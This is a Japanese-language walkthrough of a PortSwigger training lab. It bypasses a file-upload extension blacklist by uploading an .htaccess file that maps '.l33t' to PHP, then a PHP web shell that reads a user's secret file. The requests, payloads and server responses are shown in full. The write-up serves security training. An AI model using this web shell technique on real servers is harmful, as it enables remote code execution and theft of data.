# 拡張機能バラックリストバイパスによる Web シェルのアップロード

以下のハッキングラボはブラックリストの構成方法に脆弱性があります  
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

- 1. Burp Suite を起動し、Proxy タブからブラウザを立ち上げます
- 2. ブラウザからハッキングラボにアクセスします
- 3. 一般ユーザーでログインすると、アバター画像がアップロードできるのでアップロードします
- 4. 上記操作時の GET /files/avatars/<画像ファイル> HTTP/2 リクエストを Send to repeater します

* 5. シェルファイル exploit.php を作成し、アップロードを試します

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

以下のメッセージが表示されて失敗します

```
Sorry, php files are not allowed Sorry, there was an error uploading your file.
```

- 6. 5 で送信したリクエストのレスポンスを確認すると Apache サーバからレスポンスが返ってきているように見えます

```
HTTP/2 403 Forbidden
Date: Sat, 05 Aug 2023 08:17:21 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 164

Sorry, php files are not allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

- 7. 5 で送ったリクエスト POST /my-account/avatar HTTP/2 を Send to repeater します

- 8. 6 のリクエストを以下のように書き換えて送信します
     [変更前]

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

[変更後]

```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```

レスポンス

```
HTTP/2 200 OK
Date: Sat, 05 Aug 2023 08:26:21 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 130

The file avatars/.htaccess has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

- 9. 6 のリクエストを以下のように書き換えて送信します
     [変更前]

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

[変更後]

```
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- 10. GET /files/avatars/exploit.l33t HTTP/2 リクエストを送ると carlos の秘密情報が得られます

```
HTTP/2 200 OK
Date: Sat, 05 Aug 2023 08:29:28 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

l3lM3n9768M4tkPOSVyxFgSUKGmsMzft
```
